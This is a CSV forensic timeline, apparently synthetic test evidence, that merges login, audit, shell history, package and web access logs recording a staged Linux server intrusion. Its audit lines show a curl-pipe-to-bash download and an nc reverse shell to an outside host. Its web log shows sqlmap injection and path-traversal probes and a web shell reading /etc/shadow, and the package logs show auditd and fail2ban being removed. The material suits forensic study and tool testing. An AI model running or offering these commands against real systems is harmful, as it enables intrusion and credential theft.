datetime_utc,date,time,source,event_type,user,host,description,metadata,raw
2024-09-10T20:26:40+00:00,2024-09-10,20:26:40,wtmp,system_boot,reboot,5.15.0,wtmp: type=BOOT_TIME user=reboot line=~ host=5.15.0,"{""type"": ""BOOT_TIME"", ""pid"": 0, ""line"": ""~"", ""host"": ""5.15.0"", ""session"": 0}",
2024-09-12T00:13:20+00:00,2024-09-12,00:13:20,wtmp,session_open,alice,192.0.2.10,wtmp: type=USER_PROCESS user=alice line=pts/0 host=192.0.2.10,"{""type"": ""USER_PROCESS"", ""pid"": 8000, ""line"": ""pts/0"", ""host"": ""192.0.2.10"", ""session"": 0}",
2024-09-12T00:13:20+00:00,2024-09-12,00:13:20,utmp,system_boot,reboot,5.15.0,utmp: type=BOOT_TIME user=reboot line=~ host=5.15.0,"{""type"": ""BOOT_TIME"", ""pid"": 0, ""line"": ""~"", ""host"": ""5.15.0"", ""session"": 0}",
2024-09-12T00:13:20+00:00,2024-09-12,00:13:20,lastlog,last_login,backup,198.51.100.7,lastlog: user=backup (uid=34) line=pts/2 host=198.51.100.7,"{""uid"": 34, ""line"": ""pts/2"", ""host"": ""198.51.100.7""}",
2024-09-12T03:00:00+00:00,2024-09-12,03:00:00,wtmp,session_close,,,wtmp: type=DEAD_PROCESS user=- line=pts/0 host=-,"{""type"": ""DEAD_PROCESS"", ""pid"": 8000, ""line"": ""pts/0"", ""host"": """", ""session"": 0}",
2024-09-12T03:50:00+00:00,2024-09-12,03:50:00,btmp,login_failed,admin,192.0.2.55,btmp: type=USER_PROCESS user=admin line=ssh host=192.0.2.55,"{""type"": ""USER_PROCESS"", ""pid"": 7000, ""line"": ""ssh"", ""host"": ""192.0.2.55"", ""session"": 0}",
2024-09-12T03:50:00+00:00,2024-09-12,03:50:00,lastlog,last_login,toor,192.0.2.10,lastlog: user=toor (uid=0) line=pts/0 host=192.0.2.10,"{""uid"": 0, ""line"": ""pts/0"", ""host"": ""192.0.2.10""}",
2024-09-12T03:50:00.123000+00:00,2024-09-12,03:50:00,audit.log,audit_user_login,0,,USER_LOGIN acct=? res=? addr=- terminal=-,"{""audit_type"": ""USER_LOGIN"", ""type"": ""USER_LOGIN"", ""msg"": ""op=login id=1000 exe=\""/usr/sbin/sshd\"" hostname=192.0.2.55 addr=192.0.2.55 terminal=ssh res=success"", ""pid"": ""1234"", ""uid"": ""0"", ""auid"": ""1000"", ""ses"": ""5""}","type=USER_LOGIN msg=audit(1726113000.123:100): pid=1234 uid=0 auid=1000 ses=5 msg='op=login id=1000 exe=""/usr/sbin/sshd"" hostname=192.0.2.55 addr=192.0.2.55 terminal=ssh res=success'"
2024-09-12T03:50:02+00:00,2024-09-12,03:50:02,btmp,login_failed,admin,192.0.2.55,btmp: type=USER_PROCESS user=admin line=ssh host=192.0.2.55,"{""type"": ""USER_PROCESS"", ""pid"": 7001, ""line"": ""ssh"", ""host"": ""192.0.2.55"", ""session"": 0}",
2024-09-12T03:50:04+00:00,2024-09-12,03:50:04,btmp,login_failed,admin,192.0.2.55,btmp: type=USER_PROCESS user=admin line=ssh host=192.0.2.55,"{""type"": ""USER_PROCESS"", ""pid"": 7002, ""line"": ""ssh"", ""host"": ""192.0.2.55"", ""session"": 0}",
2024-09-12T03:50:06+00:00,2024-09-12,03:50:06,btmp,login_failed,admin,192.0.2.55,btmp: type=USER_PROCESS user=admin line=ssh host=192.0.2.55,"{""type"": ""USER_PROCESS"", ""pid"": 7003, ""line"": ""ssh"", ""host"": ""192.0.2.55"", ""session"": 0}",
2024-09-12T03:50:08+00:00,2024-09-12,03:50:08,btmp,login_failed,admin,192.0.2.55,btmp: type=USER_PROCESS user=admin line=ssh host=192.0.2.55,"{""type"": ""USER_PROCESS"", ""pid"": 7004, ""line"": ""ssh"", ""host"": ""192.0.2.55"", ""session"": 0}",
2024-09-12T03:51:00.456000+00:00,2024-09-12,03:51:00,audit.log,audit_execve,,,EXECVE: /bin/bash -c curl -s http://198.51.100.7/x.sh | bash,"{""audit_type"": ""EXECVE"", ""type"": ""EXECVE"", ""msg"": ""audit(1726113060.456:200):"", ""argc"": ""3"", ""a0"": ""/bin/bash"", ""a1"": ""-c"", ""a2"": ""curl -s http://198.51.100.7/x.sh | bash""}","type=EXECVE msg=audit(1726113060.456:200): argc=3 a0=""/bin/bash"" a1=""-c"" a2=""curl -s http://198.51.100.7/x.sh | bash"""
2024-09-12T03:52:00.789000+00:00,2024-09-12,03:52:00,audit.log,audit_execve,,,EXECVE: nc -e /bin/sh 198.51.100.7,"{""audit_type"": ""EXECVE"", ""type"": ""EXECVE"", ""msg"": ""audit(1726113120.789:201):"", ""argc"": ""4"", ""a0"": ""nc"", ""a1"": ""-e"", ""a2"": ""/bin/sh"", ""a3"": ""198.51.100.7""}","type=EXECVE msg=audit(1726113120.789:201): argc=4 a0=""nc"" a1=""-e"" a2=""/bin/sh"" a3=""198.51.100.7"""
2024-09-12T03:53:20.111000+00:00,2024-09-12,03:53:20,audit.log,audit_avc,,,AVC denied: sshd -> unconfined_u:object_r:user_home_t:s0 (system_u:system_r:sshd_t:s0-s0:c0.c1023),"{""audit_type"": ""AVC"", ""type"": ""AVC"", ""msg"": ""audit(1726113200.111:300):"", ""pid"": ""2222"", ""comm"": ""sshd"", ""name"": ""badbin"", ""dev"": ""dm-0"", ""ino"": ""12345"", ""scontext"": ""system_u:system_r:sshd_t:s0-s0:c0.c1023"", ""tcontext"": ""unconfined_u:object_r:user_home_t:s0"", ""tclass"": ""file""}","type=AVC msg=audit(1726113200.111:300): avc:  denied  { execute } for  pid=2222 comm=""sshd"" name=""badbin"" dev=""dm-0"" ino=12345 scontext=system_u:system_r:sshd_t:s0-s0:c0.c1023 tcontext=unconfined_u:object_r:user_home_t:s0 tclass=file"
2024-09-12T03:55:00+00:00,2024-09-12,03:55:00,audit.log,audit_anom_promiscuous,0,,ANOM_PROMISCUOUS type=ANOM_PROMISCUOUS msg=audit(1726113300.000:400): dev=eth0 prom=256 old_prom=0 auid=0 uid=0 gid=0,"{""audit_type"": ""ANOM_PROMISCUOUS"", ""type"": ""ANOM_PROMISCUOUS"", ""msg"": ""audit(1726113300.000:400):"", ""dev"": ""eth0"", ""prom"": ""256"", ""old_prom"": ""0"", ""auid"": ""0"", ""uid"": ""0"", ""gid"": ""0"", ""ses"": ""4""}",type=ANOM_PROMISCUOUS msg=audit(1726113300.000:400): dev=eth0 prom=256 old_prom=0 auid=0 uid=0 gid=0 ses=4
2024-09-12T03:56:40.222000+00:00,2024-09-12,03:56:40,audit.log,audit_user_auth,0,,USER_AUTH acct=? res=? addr=- terminal=-,"{""audit_type"": ""USER_AUTH"", ""type"": ""USER_AUTH"", ""msg"": ""op=PAM:authentication acct=\""bob\"" exe=\""/usr/bin/sudo\"" hostname=? addr=? terminal=pts/1 res=failed"", ""pid"": ""3333"", ""uid"": ""0"", ""auid"": ""1001"", ""ses"": ""6""}","type=USER_AUTH msg=audit(1726113400.222:500): pid=3333 uid=0 auid=1001 ses=6 msg='op=PAM:authentication acct=""bob"" exe=""/usr/bin/sudo"" hostname=? addr=? terminal=pts/1 res=failed'"
2024-09-12T03:58:20+00:00,2024-09-12,03:58:20,wtmp,session_open,www-data,198.51.100.99,wtmp: type=USER_PROCESS user=www-data line=pts/3 host=198.51.100.99,"{""type"": ""USER_PROCESS"", ""pid"": 9002, ""line"": ""pts/3"", ""host"": ""198.51.100.99"", ""session"": 0}",
2024-09-12T03:58:20+00:00,2024-09-12,03:58:20,utmp,session_open,www-data,198.51.100.99,utmp: type=USER_PROCESS user=www-data line=pts/3 host=198.51.100.99,"{""type"": ""USER_PROCESS"", ""pid"": 9002, ""line"": ""pts/3"", ""host"": ""198.51.100.99"", ""session"": 0}",
2024-09-12T03:58:20+00:00,2024-09-12,03:58:20,lastlog,last_login,www-data,198.51.100.99,lastlog: user=www-data (uid=33) line=pts/3 host=198.51.100.99,"{""uid"": 33, ""line"": ""pts/3"", ""host"": ""198.51.100.99""}",
2024-09-12T04:00:00+00:00,2024-09-12,04:00:00,.bash_history,shell_command,claude,,claude: ls -la,"{""history_file"": ""/home/claude/test_evidence/home/alice/.bash_history""}",ls -la
2024-09-12T04:00:10+00:00,2024-09-12,04:00:10,.bash_history,shell_command,claude,,claude: cd ~/projects,"{""history_file"": ""/home/claude/test_evidence/home/alice/.bash_history""}",cd ~/projects
2024-09-12T04:01:40+00:00,2024-09-12,04:01:40,.bash_history,shell_command,claude,,claude: git pull,"{""history_file"": ""/home/claude/test_evidence/home/alice/.bash_history""}",git pull
2024-09-12T04:03:20+00:00,2024-09-12,04:03:20,.bash_history,shell_command,claude,,claude: sudo apt update,"{""history_file"": ""/home/claude/test_evidence/home/alice/.bash_history""}",sudo apt update
2024-09-12T04:05:00+00:00,2024-09-12,04:05:00,wtmp,session_open,alice,192.0.2.10,wtmp: type=USER_PROCESS user=alice line=pts/0 host=192.0.2.10,"{""type"": ""USER_PROCESS"", ""pid"": 9001, ""line"": ""pts/0"", ""host"": ""192.0.2.10"", ""session"": 0}",
2024-09-12T04:05:00+00:00,2024-09-12,04:05:00,utmp,session_open,alice,192.0.2.10,utmp: type=USER_PROCESS user=alice line=pts/0 host=192.0.2.10,"{""type"": ""USER_PROCESS"", ""pid"": 9001, ""line"": ""pts/0"", ""host"": ""192.0.2.10"", ""session"": 0}",
2024-09-12T04:05:00+00:00,2024-09-12,04:05:00,lastlog,last_login,alice,192.0.2.10,lastlog: user=alice (uid=1000) line=pts/1 host=192.0.2.10,"{""uid"": 1000, ""line"": ""pts/1"", ""host"": ""192.0.2.10""}",
2024-09-12T04:05:00+00:00,2024-09-12,04:05:00,.bash_history,shell_command,claude,,claude: sudo apt install nginx,"{""history_file"": ""/home/claude/test_evidence/home/alice/.bash_history""}",sudo apt install nginx
2025-09-12T03:00:11+00:00,2025-09-12,03:00:11,apt/history.log,package_install,alice,,apt install: nginx (cmd=apt-get install nginx),"{""package"": ""nginx"", ""action"": ""install"", ""command"": ""apt-get install nginx"", ""user"": ""alice""}",2025-09-12  03:00:11  Install: nginx:amd64 (1.18.0-6ubuntu14.4)
2025-09-12T03:00:12+00:00,2025-09-12,03:00:12,dpkg.log,package_install,,,dpkg install: nginx (<none> -> 1.18.0-6ubuntu14.4),"{""package"": ""nginx"", ""action"": ""install"", ""old"": ""<none>"", ""new"": ""1.18.0-6ubuntu14.4""}",2025-09-12 03:00:12 install nginx:amd64 <none> 1.18.0-6ubuntu14.4
2025-09-12T03:00:14+00:00,2025-09-12,03:00:14,dpkg.log,package_status,,,dpkg status: half-installed (nginx:amd64 -> 1.18.0-6ubuntu14.4),"{""package"": ""half-installed"", ""action"": ""status"", ""old"": ""nginx:amd64"", ""new"": ""1.18.0-6ubuntu14.4""}",2025-09-12 03:00:14 status half-installed nginx:amd64 1.18.0-6ubuntu14.4
2025-09-12T03:00:15+00:00,2025-09-12,03:00:15,dpkg.log,package_status,,,dpkg status: installed (nginx:amd64 -> 1.18.0-6ubuntu14.4),"{""package"": ""installed"", ""action"": ""status"", ""old"": ""nginx:amd64"", ""new"": ""1.18.0-6ubuntu14.4""}",2025-09-12 03:00:15 status installed nginx:amd64 1.18.0-6ubuntu14.4
2025-09-12T03:14:01+00:00,2025-09-12,03:14:01,web_access,http_request,,,"203.0.113.10 ""GET / HTTP/1.1"" 200 ua=""Mozilla/5.0 (X11; Linux x86_64)""","{""ip"": ""203.0.113.10"", ""request"": ""GET / HTTP/1.1"", ""status"": 200, ""user_agent"": ""Mozilla/5.0 (X11; Linux x86_64)"", ""size"": ""1543"", ""referer"": ""-""}","203.0.113.10 - - [12/Sep/2025:03:14:01 +0000] ""GET / HTTP/1.1"" 200 1543 ""-"" ""Mozilla/5.0 (X11; Linux x86_64)"""
2025-09-12T03:14:05+00:00,2025-09-12,03:14:05,web_access,http_request,,,"203.0.113.10 ""GET /favicon.ico HTTP/1.1"" 200 ua=""Mozilla/5.0""","{""ip"": ""203.0.113.10"", ""request"": ""GET /favicon.ico HTTP/1.1"", ""status"": 200, ""user_agent"": ""Mozilla/5.0"", ""size"": ""318"", ""referer"": ""-""}","203.0.113.10 - - [12/Sep/2025:03:14:05 +0000] ""GET /favicon.ico HTTP/1.1"" 200 318 ""-"" ""Mozilla/5.0"""
2025-09-12T04:00:01+00:00,2025-09-12,04:00:01,web_access,http_request,,,"198.51.100.55 ""GET / HTTP/1.1"" 200 ua=""sqlmap/1.7.2#stable (https://sqlmap.org)""","{""ip"": ""198.51.100.55"", ""request"": ""GET / HTTP/1.1"", ""status"": 200, ""user_agent"": ""sqlmap/1.7.2#stable (https://sqlmap.org)"", ""size"": ""1543"", ""referer"": ""-""}","198.51.100.55 - - [12/Sep/2025:04:00:01 +0000] ""GET / HTTP/1.1"" 200 1543 ""-"" ""sqlmap/1.7.2#stable (https://sqlmap.org)"""
2025-09-12T04:00:02+00:00,2025-09-12,04:00:02,web_access,http_request,,,"198.51.100.55 ""GET /index.php?id=1' HTTP/1.1"" 500 ua=""sqlmap/1.7.2#stable""","{""ip"": ""198.51.100.55"", ""request"": ""GET /index.php?id=1' HTTP/1.1"", ""status"": 500, ""user_agent"": ""sqlmap/1.7.2#stable"", ""size"": ""245"", ""referer"": ""-""}","198.51.100.55 - - [12/Sep/2025:04:00:02 +0000] ""GET /index.php?id=1' HTTP/1.1"" 500 245 ""-"" ""sqlmap/1.7.2#stable"""
2025-09-12T04:00:03+00:00,2025-09-12,04:00:03,web_access,http_request,,,"198.51.100.55 ""GET /admin/../../etc/passwd HTTP/1.1"" 404 ua=""sqlmap/1.7.2#stable""","{""ip"": ""198.51.100.55"", ""request"": ""GET /admin/../../etc/passwd HTTP/1.1"", ""status"": 404, ""user_agent"": ""sqlmap/1.7.2#stable"", ""size"": ""162"", ""referer"": ""-""}","198.51.100.55 - - [12/Sep/2025:04:00:03 +0000] ""GET /admin/../../etc/passwd HTTP/1.1"" 404 162 ""-"" ""sqlmap/1.7.2#stable"""
2025-09-12T04:30:11+00:00,2025-09-12,04:30:11,web_access,http_request,,,"198.51.100.99 ""GET /uploads/wso.php?cmd=id HTTP/1.1"" 200 ua=""Mozilla/5.0""","{""ip"": ""198.51.100.99"", ""request"": ""GET /uploads/wso.php?cmd=id HTTP/1.1"", ""status"": 200, ""user_agent"": ""Mozilla/5.0"", ""size"": ""543"", ""referer"": ""-""}","198.51.100.99 - - [12/Sep/2025:04:30:11 +0000] ""GET /uploads/wso.php?cmd=id HTTP/1.1"" 200 543 ""-"" ""Mozilla/5.0"""
2025-09-12T04:30:15+00:00,2025-09-12,04:30:15,web_access,http_request,,,"198.51.100.99 ""GET /uploads/wso.php?cmd=whoami HTTP/1.1"" 200 ua=""Mozilla/5.0""","{""ip"": ""198.51.100.99"", ""request"": ""GET /uploads/wso.php?cmd=whoami HTTP/1.1"", ""status"": 200, ""user_agent"": ""Mozilla/5.0"", ""size"": ""19"", ""referer"": ""-""}","198.51.100.99 - - [12/Sep/2025:04:30:15 +0000] ""GET /uploads/wso.php?cmd=whoami HTTP/1.1"" 200 19 ""-"" ""Mozilla/5.0"""
2025-09-12T04:30:20+00:00,2025-09-12,04:30:20,apt/history.log,package_remove,alice,,apt remove: auditd (cmd=apt-get remove auditd fail2ban),"{""package"": ""auditd"", ""action"": ""remove"", ""command"": ""apt-get remove auditd fail2ban"", ""user"": ""alice""}",2025-09-12  04:30:20  Remove: auditd:amd64 (1:3.0.7-1build1)
2025-09-12T04:30:20+00:00,2025-09-12,04:30:20,apt/history.log,package_remove,alice,,apt remove: fail2ban (cmd=apt-get remove auditd fail2ban),"{""package"": ""fail2ban"", ""action"": ""remove"", ""command"": ""apt-get remove auditd fail2ban"", ""user"": ""alice""}",2025-09-12  04:30:20  Remove: fail2ban:all (0.11.2-6)
2025-09-12T04:30:21+00:00,2025-09-12,04:30:21,dpkg.log,package_remove,,,dpkg remove: auditd (1:3.0.7-1build1 -> <none>),"{""package"": ""auditd"", ""action"": ""remove"", ""old"": ""1:3.0.7-1build1"", ""new"": ""<none>""}",2025-09-12 04:30:21 remove auditd:amd64 1:3.0.7-1build1 <none>
2025-09-12T04:30:22+00:00,2025-09-12,04:30:22,dpkg.log,package_status,,,dpkg status: config-files (auditd:amd64 -> 1:3.0.7-1build1),"{""package"": ""config-files"", ""action"": ""status"", ""old"": ""auditd:amd64"", ""new"": ""1:3.0.7-1build1""}",2025-09-12 04:30:22 status config-files auditd:amd64 1:3.0.7-1build1
2025-09-12T04:30:30+00:00,2025-09-12,04:30:30,dpkg.log,package_remove,,,dpkg remove: fail2ban (0.11.2-6 -> <none>),"{""package"": ""fail2ban"", ""action"": ""remove"", ""old"": ""0.11.2-6"", ""new"": ""<none>""}",2025-09-12 04:30:30 remove fail2ban:all 0.11.2-6 <none>
2025-09-12T04:30:30+00:00,2025-09-12,04:30:30,web_access,http_request,,,"198.51.100.99 ""GET /uploads/wso.php?cmd=cat+/etc/shadow HTTP/1.1"" 200 ua=""Mozilla/5.0""","{""ip"": ""198.51.100.99"", ""request"": ""GET /uploads/wso.php?cmd=cat+/etc/shadow HTTP/1.1"", ""status"": 200, ""user_agent"": ""Mozilla/5.0"", ""size"": ""1029"", ""referer"": ""-""}","198.51.100.99 - - [12/Sep/2025:04:30:30 +0000] ""GET /uploads/wso.php?cmd=cat+/etc/shadow HTTP/1.1"" 200 1029 ""-"" ""Mozilla/5.0"""
2025-09-12T04:30:31+00:00,2025-09-12,04:30:31,dpkg.log,package_status,,,dpkg status: not-installed (fail2ban:all -> <none>),"{""package"": ""not-installed"", ""action"": ""status"", ""old"": ""fail2ban:all"", ""new"": ""<none>""}",2025-09-12 04:30:31 status not-installed fail2ban:all <none>
2025-09-12T05:00:01+00:00,2025-09-12,05:00:01,web_access,http_request,,,"192.0.2.222 ""GET /admin HTTP/1.1"" 404 ua=""Mozilla/5.0""","{""ip"": ""192.0.2.222"", ""request"": ""GET /admin HTTP/1.1"", ""status"": 404, ""user_agent"": ""Mozilla/5.0"", ""size"": ""245"", ""referer"": ""-""}","192.0.2.222 - - [12/Sep/2025:05:00:01 +0000] ""GET /admin HTTP/1.1"" 404 245 ""-"" ""Mozilla/5.0"""
2025-09-12T05:00:02+00:00,2025-09-12,05:00:02,web_access,http_request,,,"192.0.2.222 ""GET /backup HTTP/1.1"" 404 ua=""Mozilla/5.0""","{""ip"": ""192.0.2.222"", ""request"": ""GET /backup HTTP/1.1"", ""status"": 404, ""user_agent"": ""Mozilla/5.0"", ""size"": ""245"", ""referer"": ""-""}","192.0.2.222 - - [12/Sep/2025:05:00:02 +0000] ""GET /backup HTTP/1.1"" 404 245 ""-"" ""Mozilla/5.0"""
